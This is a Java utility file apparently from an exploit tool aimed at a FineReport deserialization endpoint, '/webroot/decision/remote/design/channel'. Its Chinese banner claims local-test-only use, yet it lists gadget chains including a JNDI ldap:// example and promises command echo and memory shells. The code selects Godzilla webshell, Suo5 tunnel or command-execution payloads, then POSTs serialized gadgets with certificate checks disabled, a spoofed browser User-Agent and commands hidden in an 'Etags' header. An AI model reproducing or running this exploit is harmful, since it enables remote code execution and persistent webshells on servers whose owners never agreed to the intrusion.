package com.h2tg.frchannel;

import org.apache.http.HttpHost;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.config.RequestConfig;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.conn.ssl.SSLConnectionSocketFactory;
import org.apache.http.entity.ByteArrayEntity;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.ssl.SSLContextBuilder;
import org.apache.http.util.EntityUtils;

import javax.net.ssl.SSLContext;
import java.lang.reflect.InvocationTargetException;
import java.util.Base64;

public class Utils
{
    public static final String banner = "\n" +
            "1. 本工具仅用于本地模拟环境测试\n\n" +
            "2. 漏洞路径: /webroot/decision/remote/design/channel\n\n" +
            "3. URLDNS链利用类型请选择Other，参数如：xxxxxx.dnslog.cn\n\n" +
            "4. HSqlJNDI链利用类型请选择Other，参数如：ldap://127.0.0.1:1389/xxx\n\n" +
            "5. 其余利用链均支持命令回显与内存马\n\n";

    public static final String godzilla = "";
//    public static final String godzilla = "";
    public static final String echo = "";
    public static final String suo5 = "";

    // 检测是否为空值
    public static boolean check(String s)
    {
        return s != null && !s.isEmpty();
    }

    // 检测url是否合法
    public static boolean checkUrl(String url)
    {
        return url != null && !url.isEmpty() && (url.startsWith("https://") || url.startsWith("http://"));
    }

    public static byte[] generate(String gadget, String payloadType) throws Exception
    {
        byte[] payload = null;
        switch (payloadType) {
            case "CmdExec":
                payload = Base64.getDecoder().decode(echo);
                break;
            case "Godzilla":
                payload = Base64.getDecoder().decode(godzilla);
                break;
            case "Suo5":
                payload = Base64.getDecoder().decode(suo5);
                break;
            default:
                break;
        }

        Class<?> gadgetClass = Class.forName("com.h2tg.frchannel.gadget." + gadget);

        return (byte[]) gadgetClass.getMethod("getPayload", byte[].class).invoke(null, payload);
    }

    // 发送payload
    public static String send(String url, byte[] bytes, String cmd, HttpHost proxy) throws Exception
    {

        HttpClient httpClient = null;

        if (url.contains("https://")) {
            SSLContext sslContext = SSLContextBuilder.create().useProtocol(SSLConnectionSocketFactory.SSL).loadTrustMaterial((x, y) -> true).build();
            RequestConfig config = RequestConfig.custom().setConnectTimeout(5000).setSocketTimeout(5000).build();
            httpClient = HttpClientBuilder.create().setDefaultRequestConfig(config).setSSLContext(sslContext).setSSLHostnameVerifier((x, y) -> true).build();
        } else {
            httpClient = HttpClients.createDefault();
        }

        HttpPost httpPost = new HttpPost(url);

        httpPost.setEntity(new ByteArrayEntity(bytes));
        // 创建RequestConfig，并设置代理
        RequestConfig config = RequestConfig.custom()
                .setProxy(proxy)
                .setSocketTimeout(10000)
                .setConnectTimeout(10000)
                .build();
        // 将RequestConfig配置应用于HttpPost
        httpPost.setConfig(config);
        httpPost.setHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36");
        httpPost.setHeader("Content-Type", "gzip");

        if (cmd != null) {
            httpPost.setHeader("Etags", Base64.getEncoder().encodeToString(cmd.getBytes()));
        }

        try {
            HttpResponse response = httpClient.execute(httpPost);
            return EntityUtils.toString(response.getEntity());

        } catch (Exception e) {
            return e.getMessage();
        }
    }
}
